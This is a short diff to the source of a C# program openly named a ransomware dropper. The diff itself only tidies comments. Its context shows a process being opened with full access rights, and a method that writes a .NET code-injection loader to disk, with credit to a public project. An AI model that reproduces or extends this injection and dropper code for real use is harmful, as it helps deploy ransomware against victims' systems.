@@ -85,7 +85,6 @@ namespace BisquillaRansomwareDropper
             }
 
 
-
             /*** Open and get handle of the process - with required privileges ***/
             IntPtr targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);
             if (targetProcessHandle == null || targetProcessHandle == IntPtr.Zero)
@@ -135,7 +134,9 @@ namespace BisquillaRansomwareDropper
 
 
         /// <summary>
-        /// Extract DNCI CPP Loader and Save to Disk
+        /// Extract DNCI CPP Loader and Save to Disk.
+        /// The DNCI Loader used here is a Base64 Enconded version available at: https://github.com/guibacellar/DNCI/tree/master/Binaries
+        /// The DNCI Project and Source Code can be accessed at: https://github.com/guibacellar/DNCI
         /// </summary>
         /// <returns>File Path</returns>
         private static string ExtractCppLoader()
